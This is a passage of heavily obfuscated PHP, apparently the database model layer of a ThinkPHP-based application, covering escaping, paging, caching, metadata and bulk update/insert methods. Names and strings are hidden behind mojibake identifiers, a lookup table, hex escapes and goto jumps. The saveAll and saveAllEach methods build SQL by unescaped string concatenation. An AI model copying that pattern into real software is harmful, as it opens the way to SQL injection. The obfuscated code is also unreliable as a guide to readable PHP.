$aƒ³—Ñ‹äŒ[2]; } else { $this->error = $A¡øÅÂÁ„‡[33]; } if ($A¡øÅÂÁ„‡[33] != $this->queryStr) { $this->error .= LNG($A¡øÅÂÁ„‡[45]) . $this->queryStr; } think_trace($this->error, $A¡øÅÂÁ„‡[33], $A¡øÅÂÁ„‡[46]); return $this->error; } public function escapeString($Cì¸°øÔ¬) { $A¯ÂÇµ…‚Í =& $_SERVER[…Ò×–]; switch ($this->dbType) { case $A¯ÂÇµ…‚Í[865]: case $A¯ÂÇµ…‚Í[838]: case $A¯ÂÇµ…‚Í[856]: case $A¯ÂÇµ…‚Í[868]: return addslashes($Cì¸°øÔ¬); case $A¯ÂÇµ…‚Í[840]: case $A¯ÂÇµ…‚Í[857]: case $A¯ÂÇµ…‚Í[839]: case $A¯ÂÇµ…‚Í[841]: return str_ireplace($A¯ÂÇµ…‚Í[55], $A¯ÂÇµ…‚Í[56], $Cì¸°øÔ¬); } } protected function parseValue($BÁÃÏ°×Äã) { $cÒê‹¬É™¸ =& $_SERVER[…Ò×–]; if (is_string($BÁÃÏ°×Äã)) { $BÁÃÏ°×Äã = strpos($BÁÃÏ°×Äã, $cÒê‹¬É™¸[4]) === 0 ? $this->escapeString($BÁÃÏ°×Äã) : $cÒê‹¬É™¸[878] . $this->escapeString($BÁÃÏ°×Äã) . $cÒê‹¬É™¸[878]; } elseif (isset($BÁÃÏ°×Äã[0]) && is_string($BÁÃÏ°×Äã[0]) && strtolower($BÁÃÏ°×Äã[0]) == $cÒê‹¬É™¸[289]) { $BÁÃÏ°×Äã = $this->escapeString($BÁÃÏ°×Äã[1]); } elseif (is_array($BÁÃÏ°×Äã)) { $BÁÃÏ°×Äã = array_map(array($this, $cÒê‹¬É™¸[879]), $BÁÃÏ°×Äã); } elseif (is_bool($BÁÃÏ°×Äã)) { $BÁÃÏ°×Äã = $BÁÃÏ°×Äã ? $cÒê‹¬É™¸[83] : $cÒê‹¬É™¸[473]; } elseif (is_null($BÁÃÏ°×Äã)) { $BÁÃÏ°×Äã = $cÒê‹¬É™¸[99]; } return $BÁÃÏ°×Äã; } public function getLastInsertId() { $e“´ŠÁ§æ =& $_SERVER[…Ò×–]; switch ($this->dbType) { case $e“´ŠÁ§æ[865]: case $e“´ŠÁ§æ[857]: case $e“´ŠÁ§æ[838]: case $e“´ŠÁ§æ[856]: case $e“´ŠÁ§æ[840]: case $e“´ŠÁ§æ[868]: return $this->_linkID->lastInsertId(); case $e“´ŠÁ§æ[839]: case $e“´ŠÁ§æ[841]: $fšíµç¸Ó¼ = $this->table; $aÂŠçãÖ§İ = $this->query("\x53\105\114\105\103\x54\40{$fšíµç¸Ó¼}\x2e\x63\165\162\x72\166\141\154\40\x63\165\x72\162\166\x61\154\40\x46\122\x4f\115\40\x64\165\141\x6c"); return $aÂŠçãÖ§İ ? $aÂŠçãÖ§İ[0][$e“´ŠÁ§æ[880]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($FÌª†å³Ğõ) { $f®ƒ¿†è„ê =& $_SERVER[…Ò×–]; if (!CacheLock::fileLock($f®ƒ¿†è„ê[9])) { return !1; } $d˜÷´Ìë‘é = parent::query($FÌª†å³Ğõ); CacheLock::fileUnLock($f®ƒ¿†è„ê[9]); return $d˜÷´Ìë‘é; } public function execute($eÎ†´×´ç—) { $FåŒ˜íñ´ô =& $_SERVER[…Ò×–]; if (!CacheLock::fileLock($FåŒ˜íñ´ô[9])) { return !1; } $eÕ‘ß›­†ã = parent::execute($eÎ†´×´ç—); CacheLock::fileUnLock($FåŒ˜íñ´ô[9]); return $eÕ‘ß›­†ã; } } goto dê‘ñ´ÕÉ‘; BÎÇ¥ê‰£ª: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\151\146\x79\x54\151\x6d\x65", "\x74\151\x6d\x65", "\151\156\x73\145\x72\164\54\x75\x70\x64\141\x74\145", "\x66\x75\x6e\143\164\151\x6f\156"), array("\143\162\145\x61\x74\x65\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\x6e\x73\x65\162\164", "\146\165\156\143\164\x69\157\x6e")); public function setDataAuto($BÕ†ŞÓÖ) { $this->dataAuto = $BÕ†ŞÓÖ; } public function __construct($E ô »õ„ï = '', $déö”Á…ˆŠ = '', $Fïõ³ìË˜ê = '') { parent::__construct($E ô »õ„ï, $déö”Á…ˆŠ, $Fïõ³ìË˜ê); } public static function textEncode($D½ÅÛùç) { if (!$D½ÅÛùç) { return $D½ÅÛùç; } $dÊ¨ºï¼‘é = json_encode($D½ÅÛùç); $dÊ¨ºï¼‘é = preg_replace_callback($_SERVER[…Ò×–][346], function ($EÛ°Ïİ˜‹ï) { return addslashes($EÛ°Ïİ˜‹ï[0]); }, $dÊ¨ºï¼‘é); return json_decode($dÊ¨ºï¼‘é); } public static function textDecode($b´Ì…šËê) { $dÌ»…ôç¤ =& $_SERVER[…Ò×–]; $Fò³‡ß²Õ£ = json_encode($b´Ì…šËê); $Fò³‡ß²Õ£ = preg_replace_callback($dÌ»…ôç¤[347], function ($Aé’½™ö) { return $_SERVER[…Ò×–][93]; }, $Fò³‡ß²Õ£); return json_decode($Fò³‡ß²Õ£); } protected $tableMeta = array(); protected function _beforeInsert(&$CÅ¨¨†·êø, $cÕ‰Ôß¹ë) { $B÷Ê¤æèâ =& $_SERVER[…Ò×–]; if (!$this->checkDataAutoHas($B÷Ê¤æèâ[348])) { return; } $this->dataBeforeFilter($CÅ¨¨†·êø, $B÷Ê¤æèâ[348]); } protected function _beforeUpdate(&$fÒƒ’àšÄÓ, $c…×†¦´ä‡) { $cµ§öæ‚Ö· =& $_SERVER[…Ò×–]; if (!$this->checkDataAutoHas($cµ§öæ‚Ö·[349])) { return; } $this->dataBeforeFilter($fÒƒ’àšÄÓ, $cµ§öæ‚Ö·[349]); } protected function _afterSelect(&$d¡í¶©ªï™, $DÒÙ‚÷­) { if (!is_array($d¡í¶©ªï™)) { return; } if (!$this->checkDataAutoHas($_SERVER[…Ò×–][350])) { return; } foreach ($d¡í¶©ªï™ as &$cåèÁ”¾¢„) { $this->dataAfterFilter($cåèÁ”¾¢„); } unset($cåèÁ”¾¢„); } protected function _afterFind(&$F³‚ ‘‰Æ, $aîŠÙ¸¨®¸) { if (!is_array($F³‚ ‘‰Æ)) { return; } if (!$this->checkDataAutoHas($_SERVER[…Ò×–][350])) { return; } $this->dataAfterFilter($F³‚ ‘‰Æ); } public function setAutoIncrement($FÄÅ¡£°Ì) { $eŠ©³˜‚Úœ = array($this->getPk() => $FÄÅ¡£°Ì); $cò¨†Ù…¨Á = $this->data($eŠ©³˜‚Úœ)->add(); if ($cò¨†Ù…¨Á) { $this->delete($cò¨†Ù…¨Á); } } public function getAutoIncrement() { $BšÛ©¡Øó© = $this->getTableName(); $d‘ç”ƒ‹ÙÏ = $this->max($this->getPk()); $Føø–ã¬‰ê = $this->query("\163\150\x6f\x77\x20\x74\x61\142\154\x65\40\163\164\141\x74\165\x73\40\167\150\x65\162\145\x20\x4e\141\155\x65\75\47{$BšÛ©¡Øó©}\x27"); $Cİ“®¿Á = $Føø–ã¬‰ê[0][$_SERVER[…Ò×–][351]]; $CÅò©òí = max($d‘ç”ƒ‹ÙÏ, $Cİ“®¿Á); return $CÅò©òí; } protected function _callBefore($eº¶ğµèõ‘, $a‰ˆ¬Ç†™) { return $this->cacheCallCheck($eº¶ğµèõ‘, $a‰ˆ¬Ç†™, !1); } protected function _callAfter($F¥…£Úâ Í, $D¯õíÒ¶ë°) { return $this->cacheCallCheck($F¥…£Úâ Í, $D¯õíÒ¶ë°, !0); } protected function cacheFunctionAlias($e³ĞìË«Ÿ—) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($AÑÒ•ÄŠÜÌ, $A•“ ëÃ¯Ø, $e÷ÃÈ£ë« = false) { $Cñœ¾Î¼¹ = $this->cacheFunctionAlias($A•“ ëÃ¯Ø); if (!$Cñœ¾Î¼¹) { return; } foreach ($Cñœ¾Î¼¹ as $dš½¸Ê¨¼… => $cŞßÖøÚ·ç) { $CĞÃòàŞÙ’ = $cŞßÖøÚ·ç[0]; $e©’œÈà¸ = explode($_SERVER[…Ò×–][47], $cŞßÖøÚ·ç[1]); if ($AÑÒ•ÄŠÜÌ == $dš½¸Ê¨¼…) { return $this->cacheFunctionGet($dš½¸Ê¨¼…, $CĞÃòàŞÙ’); } if ($e÷ÃÈ£ë« && in_array($AÑÒ•ÄŠÜÌ, $e©’œÈà¸)) { $this->cacheFunctionClear($dš½¸Ê¨¼…, $CĞÃòàŞÙ’); } } } public function cacheFunctionGet($aëºêšªÀ‡, $FÎóòéíö) { $bĞÃ“Ë¦‘¹ = $this->cacheKeyMake($aëºêšªÀ‡, $FÎóòéíö); $a‹´ñ²ç·Ó = Cache::get($bĞÃ“Ë¦‘¹); if (!is_array($a‹´ñ²ç·Ó)) { $a‹´ñ²ç·Ó = call_user_func_array(array($this, $aëºêšªÀ‡), array($FÎóòéíö, !0)); Cache::set($bĞÃ“Ë¦‘¹, $a‹´ñ²ç·Ó); } return $a‹´ñ²ç·Ó; } public function cacheFunctionClear($Fğ³òÙÓƒ¸, $fåØÑŠ¹¥ˆ) { $cÈ™‹É¿¢ê = $fåØÑŠ¹¥ˆ; if (!is_array($fåØÑŠ¹¥ˆ)) { $cÈ™‹É¿¢ê = array($fåØÑŠ¹¥ˆ); } foreach ($cÈ™‹É¿¢ê as $bÜ¸˜ÓÉŠ) { $dåë³ó™ñ™ = $this->cacheKeyMake($Fğ³òÙÓƒ¸, $bÜ¸˜ÓÉŠ); Cache::remove($dåë³ó™ñ™); } } private function cacheKeyMake($b«ò³‚æ™‘, $cÁÉíÂ¡¦) { $cĞ‚Ší˜ê =& $_SERVER[…Ò×–]; return get_class($this) . $cĞ‚Ší˜ê[70] . $b«ò³‚æ™‘ . $cĞ‚Ší˜ê[352] . $cÁÉíÂ¡¦; } protected function selectPage($FŞ˜ø¡˜éÕ = 200, $F”‹”Ä‹  = 1) { goto c÷¯Ï»»¹ø; cºÀ¸›É¥: $Aêµ³œŸ‰ = intval($this->count()); $FŞ˜ø¡˜éÕ = intval($FŞ˜ø¡˜éÕ); $FŞ˜ø¡˜éÕ = $FŞ˜ø¡˜éÕ <= 5 ? 5 : ($FŞ˜ø¡˜éÕ >= $b°½§¸ª·» ? $b°½§¸ª·» : $FŞ˜ø¡˜éÕ); goto D®×Ÿ‰âì¸; AæîÔ÷˜á: if ($AˆÉ“Ÿê»Ú == 1) { $Aêµ³œŸ‰ = count($A„ÜÜ•ßËÓ); } $açŠœˆ×…Ç = array($A¦¹‰İ±ßˆ[355] => array($A¦¹‰İ±ßˆ[356] => $Aêµ³œŸ‰, $A¦¹‰İ±ßˆ[353] => $FŞ˜ø¡˜éÕ, $A¦¹‰İ±ßˆ[344] => $F”‹”Ä‹ , $A¦¹‰İ±ßˆ[357] => $AˆÉ“Ÿê»Ú), $A¦¹‰İ±ßˆ[358] => $A„ÜÜ•ßËÓ ? $A„ÜÜ•ßËÓ : array()); return $açŠœˆ×…Ç; goto EÑ†É¿ ‹; D®×Ÿ‰âì¸: $AˆÉ“Ÿê»Ú = ceil($Aêµ³œŸ‰ / $FŞ˜ø¡˜éÕ); $F”‹”Ä‹  = intval(isset($in[$A¦¹‰İ±ßˆ[344]]) ? $in[$A¦¹‰İ±ßˆ[344]] : $F”‹”Ä‹ ); $F”‹”Ä‹  = $F”‹”Ä‹  <= 1 ? 1 : ($F”‹”Ä‹  >= $AˆÉ“Ÿê»Ú ? $AˆÉ“Ÿê»Ú : $F”‹”Ä‹ ); goto E–›ÓĞ ×Î; cîÉî¶ºá²: $b°½§¸ª·» = 4000; $FŞ˜ø¡˜éÕ = isset($in[$A¦¹‰İ±ßˆ[353]]) ? $in[$A¦¹‰İ±ßˆ[353]] : $FŞ˜ø¡˜éÕ; if ($FŞ˜ø¡˜éÕ === -1) { unset($in[$A¦¹‰İ±ßˆ[353]]); $b°½§¸ª·» = 100000000; $FŞ˜ø¡˜éÕ = $b°½§¸ª·»; } goto dÀº„×ÙŸô; c÷¯Ï»»¹ø: $A¦¹‰İ±ßˆ =& $_SERVER[…Ò×–]; global $in; $Cƒ¸™Ñ·òê = $this->optionsValue(); goto cîÉî¶ºá²; E–›ÓĞ ×Î: $this->optionsValue($Cƒ¸™Ñ·òê); $A„ÜÜ•ßËÓ = $this->page($F”‹”Ä‹ , $FŞ˜ø¡˜éÕ)->select(); $A„ÜÜ•ßËÓ = is_array($A„ÜÜ•ßËÓ) ? $A„ÜÜ•ßËÓ : array(); goto AæîÔ÷˜á; dÀº„×ÙŸô: $aÜŸ¦ˆ£ÁØ = $Cƒ¸™Ñ·òê; $aÜŸ¦ˆ£ÁØ[$A¦¹‰İ±ßˆ[354]] = array(); $this->optionsValue($aÜŸ¦ˆ£ÁØ); goto cºÀ¸›É¥; EÑ†É¿ ‹: } protected function checkLength($D£ŒÔ™ÔŒ®, $fä‚İ¬‘œĞ = 0, $E•Õó§µ‹Í = '') { $C‰ÈÓ£Şµ =& $_SERVER[…Ò×–]; $fä‚İ¬‘œĞ = $fä‚İ¬‘œĞ ? $fä‚İ¬‘œĞ : 65536; if (!$D£ŒÔ™ÔŒ® || strlen($D£ŒÔ™ÔŒ®) < $fä‚İ¬‘œĞ) { return; } $E•Õó§µ‹Í = $E•Õó§µ‹Í ? $E•Õó§µ‹Í . $C‰ÈÓ£Şµ[67] : $C‰ÈÓ£Şµ[33]; show_json($E•Õó§µ‹Í . LNG($C‰ÈÓ£Şµ[359]) . "\x28{$fä‚İ¬‘œĞ}\51", !1); } protected function metaSet($eÕ·™ÔÄÈ†, $f§“è—¿Øµ = null, $C¤ôİàŠ«Ê = null) { goto B¡“Ò‡©•è; B¡“Ò‡©•è: $A»±Ä†â² =& $_SERVER[…Ò×–]; if (!$this->tableMeta) { return !1; } $bËÙ´ÛõÉ = $this->tableMeta[$A»±Ä†â²[360]]; goto A…• ÔÅÑ˜; A…• ÔÅÑ˜: $Bİ‰™Æİàâ = $this->tableMeta[$A»±Ä†â²[361]]; $F‘ƒê»óÜê = Model($Bİ‰™Æİàâ); $DİÁªŒÃˆô = array($bËÙ´ÛõÉ => $eÕ·™ÔÄÈ†, $A»±Ä†â²[362] => $f§“è—¿Øµ); goto B…çØã†ÀÙ; B…çØã†ÀÙ: if (is_null($f§“è—¿Øµ)) { return $F‘ƒê»óÜê->where(array($bËÙ´ÛõÉ => $eÕ·™ÔÄÈ†))->delete(); } if (is_null($C¤ôİàŠ«Ê) && is_string($f§“è—¿Øµ)) { return $F‘ƒê»óÜê->where($DİÁªŒÃˆô)->delete(); } $C‚‡ÌŠî‹ë = is_array($f§“è—¿Øµ) ? $f§“è—¿Øµ : array(); goto E¼¤„ÕÏŸš; Aª²Ûô øç: $F‘ƒê»óÜê->where(array($bËÙ´ÛõÉ => $eÕ·™ÔÄÈ†))->addAll($Dç±®ãÏ˜, array(), !0); return !0; goto dáğ–ï‹àÛ; E¼¤„ÕÏŸš: if (is_string($f§“è—¿Øµ)) { $C‚‡ÌŠî‹ë[$f§“è—¿Øµ] = $C¤ôİàŠ«Ê; } $Dç±®ãÏ˜ = array(); foreach ($C‚‡ÌŠî‹ë as $få´Ğ«³á´ => $Bˆ¼ƒ×ÊÒ) { $this->checkLength($Bˆ¼ƒ×ÊÒ, !1, $Bİ‰™Æİàâ . $A»±Ä†â²[4] . $få´Ğ«³á´); $Dç±®ãÏ˜[] = array($bËÙ´ÛõÉ => $eÕ·™ÔÄÈ†, $A»±Ä†â²[89] => $få´Ğ«³á´, $A»±Ä†â²[363] => $Bˆ¼ƒ×ÊÒ); } goto Aª²Ûô øç; dáğ–ï‹àÛ: } public function metaGet($FÖİäÌ, $c‡¸ÒÛªå = false) { goto a¶àÕ·‘÷İ; a¶àÕ·‘÷İ: $d“¡§ä™èß =& $_SERVER[…Ò×–]; if (!$this->tableMeta) { return array(); } $C™ï±‹ã‹° = $this->tableMeta[$d“¡§ä™èß[360]]; goto a¿×àÉÎ½Œ; a¿×àÉÎ½Œ: $AãÁ±ó‘ä = Model($this->tableMeta[$d“¡§ä™èß[361]]); if ($c‡¸ÒÛªå) { $BìîÓœàëİ = array($C™ï±‹ã‹° => $FÖİäÌ, $d“¡§ä™èß[89] => $c‡¸ÒÛªå); return $AãÁ±ó‘ä->where($BìîÓœàëİ)->getField($d“¡§ä™èß[363]); } $BìîÓœàëİ = array($C™ï±‹ã‹° => $FÖİäÌ); goto f¡¦÷ì¤Ú±; f¡¦÷ì¤Ú±: $CÈÅ³åºä‘ = $AãÁ±ó‘ä->field($d“¡§ä™èß[364])->where($BìîÓœàëİ)->select(); $CÈÅ³åºä‘ = array_to_keyvalue($CÈÅ³åºä‘, $d“¡§ä™èß[89], $d“¡§ä™èß[363]); return $CÈÅ³åºä‘; goto e¸¸Ì¡·ğµ; e¸¸Ì¡·ğµ: } private function checkDataAutoHas($e”Ğë‹‹¸¡) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Dã§·Ê˜ ) { if (in_array($e”Ğë‹‹¸¡, explode($_SERVER[…Ò×–][47], $Dã§·Ê˜ [2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$C“¼ÏØ£®î, $D¶æ…ì­Ô‹) { $FÎ–¬°ß¥ =& $_SERVER[…Ò×–]; foreach ($this->dataAuto as $Dáä”²³İ) { $EƒãáæÆãÔ = $Dáä”²³İ[0]; if (!in_array($D¶æ…ì­Ô‹, explode($FÎ–¬°ß¥[47], $Dáä”²³İ[2]))) { continue; } switch (trim($Dáä”²³İ[3])) { case $FÎ–¬°ß¥[313]: case $FÎ–¬°ß¥[314]: $CŒ‰…¬Âãå = $Dáä”²³İ[1]; $CŠƒ¶Å‹¹² = isset($Dáä”²³İ[4]) ? (array) $Dáä”²³İ[4] : array(); if ($CŒ‰…¬Âãå == $FÎ–¬°ß¥[194] && array_key_exists($EƒãáæÆãÔ, $C“¼ÏØ£®î)) { if (!$C“¼ÏØ£®î[$EƒãáæÆãÔ]) { unset($C“¼ÏØ£®î[$EƒãáæÆãÔ]); } break; } if (isset($C“¼ÏØ£®î[$EƒãáæÆãÔ])) { array_unshift($CŠƒ¶Å‹¹², $C“¼ÏØ£®î[$EƒãáæÆãÔ]); } if ($FÎ–¬°ß¥[313] == $Dáä”²³İ[3]) { $C“¼ÏØ£®î[$EƒãáæÆãÔ] = call_user_func_array($CŒ‰…¬Âãå, $CŠƒ¶Å‹¹²); } else { $C“¼ÏØ£®î[$EƒãáæÆãÔ] = call_user_func_array(array(&$this, $CŒ‰…¬Âãå), $CŠƒ¶Å‹¹²); } break; case $FÎ–¬°ß¥[265]: $C“¼ÏØ£®î[$EƒãáæÆãÔ] = $C“¼ÏØ£®î[$Dáä”²³İ[1]]; break; case $FÎ–¬°ß¥[286]: if (isset($C“¼ÏØ£®î[$EƒãáæÆãÔ]) && !is_string($C“¼ÏØ£®î[$EƒãáæÆãÔ])) { $C“¼ÏØ£®î[$EƒãáæÆãÔ] = json_encode_force($C“¼ÏØ£®î[$EƒãáæÆãÔ]); } break; case $FÎ–¬°ß¥[315]: if ($C“¼ÏØ£®î[$EƒãáæÆãÔ] === $FÎ–¬°ß¥[33]) { unset($C“¼ÏØ£®î[$EƒãáæÆãÔ]); } break; case $FÎ–¬°ß¥[316]: $C“¼ÏØ£®î[$EƒãáæÆãÔ] = $Dáä”²³İ[1]; default: break; } } if ($D¶æ…ì­Ô‹ == $FÎ–¬°ß¥[348]) { $f¢œ²¤ááÆ = strtolower($this->db->getDbType()); if (strpos($f¢œ²¤ááÆ, $FÎ–¬°ß¥[9]) !== 0) { return; } $AŠÅ¼ŠË¥Å = $this->field(!0)->fields; $F‹•Àİ‰„ò = $AŠÅ¼ŠË¥Å[$FÎ–¬°ß¥[244]]; if (isset($AŠÅ¼ŠË¥Å[$FÎ–¬°ß¥[243]])) { unset($F‹•Àİ‰„ò[$AŠÅ¼ŠË¥Å[$FÎ–¬°ß¥[243]]]); } foreach ($F‹•Àİ‰„ò as $BÊùªêî­ => $D¶æ…ì­Ô‹) { if (!isset($C“¼ÏØ£®î[$BÊùªêî­])) { $C“¼ÏØ£®î[$BÊùªêî­] = $FÎ–¬°ß¥[33]; } } } } private function dataAfterFilter(&$F¿¶™’µ˜) { $eï“™èª™ =& $_SERVER[…Ò×–]; foreach ($this->dataAuto as $FêÆİƒ…) { $f§Üôë«ÍÙ = $FêÆİƒ…[0]; if (!in_array($eï“™èª™[350], explode($eï“™èª™[47], $FêÆİƒ…[2]))) { continue; } if (!isset($F¿¶™’µ˜[$f§Üôë«ÍÙ])) { continue; } switch (trim($FêÆİƒ…[3])) { case $eï“™èª™[313]: case $eï“™èª™[314]: $dÇëÉ—¢¿Ğ = isset($FêÆİƒ…[4]) ? (array) $FêÆİƒ…[4] : array(); array_unshift($dÇëÉ—¢¿Ğ, $F¿¶™’µ˜[$f§Üôë«ÍÙ]); if ($eï“™èª™[313] == $FêÆİƒ…[3]) { $F¿¶™’µ˜[$f§Üôë«ÍÙ] = call_user_func_array($FêÆİƒ…[1], $dÇëÉ—¢¿Ğ); } else { $F¿¶™’µ˜[$f§Üôë«ÍÙ] = call_user_func_array(array(&$this, $FêÆİƒ…[1]), $dÇëÉ—¢¿Ğ); } break; case $eï“™èª™[265]: $F¿¶™’µ˜[$f§Üôë«ÍÙ] = $F¿¶™’µ˜[$FêÆİƒ…[1]]; break; case $eï“™èª™[286]: $aª¢Ô©´Ù = $F¿¶™’µ˜[$f§Üôë«ÍÙ]; $F¿¶™’µ˜[$f§Üôë«ÍÙ] = json_decode($aª¢Ô©´Ù, !0); if (is_null($F¿¶™’µ˜[$f§Üôë«ÍÙ])) { $F¿¶™’µ˜[$f§Üôë«ÍÙ] = $aª¢Ô©´Ù; } break; case $eï“™èª™[315]: if ($F¿¶™’µ˜[$f§Üôë«ÍÙ] === $eï“™èª™[33]) { unset($F¿¶™’µ˜[$f§Üôë«ÍÙ]); } break; case $eï“™èª™[316]: $F¿¶™’µ˜[$f§Üôë«ÍÙ] = $FêÆİƒ…[1]; default: break; } } } public function saveAll($F…Ç‘ï´–‹) { goto c¿ˆ®è‹°´; c¿ˆ®è‹°´: $dĞˆè‘…® =& $_SERVER[…Ò×–]; $C°¿ìå°øˆ = $this->tablePrefix . $this->tableName; $cÏ¢£¤ñÓ„ = self::SQL_WHERE_IN_CHUNK; goto bÓÈàï®˜; bÓÈàï®˜: $F…Ç‘ï´–‹ = is_array($F…Ç‘ï´–‹) ? $F…Ç‘ï´–‹ : array(); $cÁ©ªÏìÜ = $dĞˆè‘…®[365]; $C›ç‡•©Ã  = 0; goto E» ›…Ö; d¶æÃøŒ¸Ş: $this->chunkEventSet(); goto D–×ïë×¦; E» ›…Ö: $fèïß¿¶›à = array(); $D”ñÅÀ„¸ğ = count($F…Ç‘ï´–‹); for ($dèÍô›ÚÆé = 0; $dèÍô›ÚÆé < $D”ñÅÀ„¸ğ; $dèÍô›ÚÆé++) { $e™„ºë‘Ôƒ = $F…Ç‘ï´–‹[$dèÍô›ÚÆé]; if (!is_array($e™„ºë‘Ôƒ) || count($e™„ºë‘Ôƒ) != 4) { continue; } $F„ÀÖÅ¤¥ = "\x55\120\104\x41\x54\105\40\x60{$C°¿ìå°øˆ}\140\40\x53\x45\124\40{$e™„ºë‘Ôƒ[2]}\40\75\x20\103\101\x53\x45\x20{$e™„ºë‘Ôƒ[0]}\40\12"; if ($C›ç‡•©Ã  == 0) { $cÁ©ªÏìÜ = $F„ÀÖÅ¤¥; } $fèïß¿¶›à[] = $dĞˆè‘…®[113] . $e™„ºë‘Ôƒ[1] . $dĞˆè‘…®[113]; $C›ç‡•©Ã ++; $cÁ©ªÏìÜ .= "\40\127\110\x45\x4e\x20\47{$e™„ºë‘Ôƒ[1]}\x27\40\x54\x48\x45\x4e\x20\x27{$e™„ºë‘Ôƒ[3]}\x27\x20\xa"; if ($C›ç‡•©Ã  == $cÏ¢£¤ñÓ„ || $dèÍô›ÚÆé == $D”ñÅÀ„¸ğ - 1) { goto f”ÇÌ¥Øè; f”ÇÌ¥Øè: $E…Áã¡ªŒ = implode($dĞˆè‘…®[47], $fèïß¿¶›à); $cÁ©ªÏìÜ .= "\x20\105\x4e\x44\x20\x20\127\110\105\122\x45\x20{$e™„ºë‘Ôƒ[0]}\x20\x49\116\x20\50{$E…Áã¡ªŒ}\x29\x20"; $this->execute($cÁ©ªÏìÜ); goto C´’ô¿Ğ¬; C´’ô¿Ğ¬: $C›ç‡•©Ã  = 0; $cÁ©ªÏìÜ = $F„ÀÖÅ¤¥; $this->chunkEventCheck(count($fèïß¿¶›à)); goto a« ÑÅæ››; a« ÑÅæ››: $fèïß¿¶›à = array(); goto e¸‹ÄÓ°; e¸‹ÄÓ°: } } goto d¶æÃøŒ¸Ş; D–×ïë×¦: } public function saveAllEach($e¹¢ìÛ–„º) { $Eªï´á‘ĞÛ =& $_SERVER[…Ò×–]; $EÍÇŒ¿™Ç = $this->tablePrefix . $this->tableName; foreach ($e¹¢ìÛ–„º as $Bğ½Ñ¶ƒî) { if (!is_array($Bğ½Ñ¶ƒî) || count($Bğ½Ñ¶ƒî) != 4) { continue; } $eÍè££˜Ü¤ = $Bğ½Ñ¶ƒî[0] . $Eªï´á‘ĞÛ[366] . $Bğ½Ñ¶ƒî[1] . $Eªï´á‘ĞÛ[113]; $E«‹Œ×ÉÔç = $Bğ½Ñ¶ƒî[2] . $Eªï´á‘ĞÛ[366] . $Bğ½Ñ¶ƒî[3] . $Eªï´á‘ĞÛ[113]; $fŠÃ¦óëÎÁ = "\165\160\x64\141\x74\145\40{$EÍÇŒ¿™Ç}\x20\163\x65\164\40{$E«‹Œ×ÉÔç}\x20\x77\x68\145\x72\145\x20{$eÍè££˜Ü¤}\73"; $this->execute($fŠÃ¦óëÎÁ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($fº˜ ”·„ç = false, $f¢ˆÄ”’Ê = false) { $this->_chunkEvent = $fº˜ ”·„ç; $this->_chunkEventParam = $f¢ˆÄ”’Ê; } private function chunkEventCheck($Cê¹¿ÅÏÇ’) { if (!$this->_chunkEvent) { return; } $Añ’ÉìŠé÷ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Añ’ÉìŠé÷[$_SERVER[…Ò×–][367]] = $Cê¹¿ÅÏÇ’; Hook::trigger($this->_chunkEvent, $Añ’ÉìŠé÷); } public function addAll($D§Ù”™ğ, $Fß—â…‡ = array(), $A½òˆÏ„´ƒ = false) { goto cĞÊŒÆÓê; CÕŒ×µ„ËÌ: if (method_exists($this->db, $b…ï˜½¨â‰[264])) { for ($aŒ©¸ˆœ­× = 0; $aŒ©¸ˆœ­× < count($D§Ù”™ğ); $aŒ©¸ˆœ­× += $C±©ì¸¹ç¬) { $fÎ³ˆ¼¢¨ = array_slice($D§Ù”™ğ, $aŒ©¸ˆœ­×, $C±©ì¸¹ç¬); if (!is_array($fÎ³ˆ¼¢¨) || count($fÎ³ˆ¼¢¨) == 0) { break; } $c¸Š´†‹‹ = $this->db->insertAll($fÎ³ˆ¼¢¨, $Fß—â…‡, $A½òˆÏ„´ƒ); $this->chunkEventCheck(count($fÎ³ˆ¼¢¨)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($D§Ù”™ğ as $f¸‘ƒ©•Ÿ => $Aä‡öœ¦“µ) { $c¸Š´†‹‹ = $this->db->insert($Aä‡öœ¦“µ, $Fß—â…‡, $A½òˆÏ„´ƒ); } $this->commit(); } if (!1 !== $c¸Š´†‹‹) { $D«øßİí÷‡ = $this->getLastInsID(); if ($D«øßİí÷‡) { return $D«øßİí÷‡; } } return $c¸Š´†‹‹; goto B…ôîÒ±‹; cĞÊŒÆÓê: $b…ï˜½¨â‰ =& $_SERVER[…Ò×–]; ignore_timeout(); $C±©ì¸¹ç¬ = self::SQL_WHERE_IN_CHUNK; goto C»Åº¦Ö¼º; C»Åº¦Ö¼º: if (empty($D§Ù”™ğ)) { $this->error = think_lang($b…ï˜½¨â‰[263]); return !1; } $Fß—â…‡ = $this->_parseOptions($Fß—â…‡); foreach ($D§Ù”™ğ as $f¸‘ƒ©•Ÿ => $Aä‡öœ¦“µ) { $D§Ù”™ğ[$f¸‘ƒ©•Ÿ] = $this->_facade($Aä‡öœ¦“µ); $this->_beforeInsert($D§Ù”™ğ[$f¸‘ƒ©•Ÿ], $Fß—â…‡); } goto CÕŒ×µ„ËÌ; B…ôîÒ±‹: } public function save($fìòÎÄêùØ = '', $e­¬’Şï˜ö = array()) { goto cç´öŸ¬´; b¾“ìÓãÇ¬: for ($A™˜ê–ö‘¾ = 0; $A™˜ê–ö‘¾ < $a¸Î’İšî; $A™˜ê–ö‘¾ += $EÑ†¹Éƒ©) { $AÓ¥¨ßëĞ‰ = array_slice($D ‰‘˜™¢„, $A™˜ê–ö‘¾, $EÑ†¹Éƒ©); if (!is_array($AÓ¥¨ßëĞ‰) || count($AÓ¥¨ßëĞ‰) == 0) { break; } $d¤˜ÊŞÀŞ¥[$b•Ğå—¢¬Â[267]][$d¸ÖÎÎŠÜ©][1] = $AÓ¥¨ßëĞ‰; $this->optionsValue($d¤˜ÊŞÀŞ¥); $eõÎ¨¦Â += parent::save($fìòÎÄêùØ, $e­¬’Şï˜ö); $this->chunkEventCheck(count($AÓ¥¨ßëĞ‰)); } $this->chunkEventSet(); return $eõÎ¨¦Â; goto e›†ˆ‹ïÄ; dˆø¡Íğçğ: $d¸ÖÎÎŠÜ© = $this->findWhereField($d¤˜ÊŞÀŞ¥); if 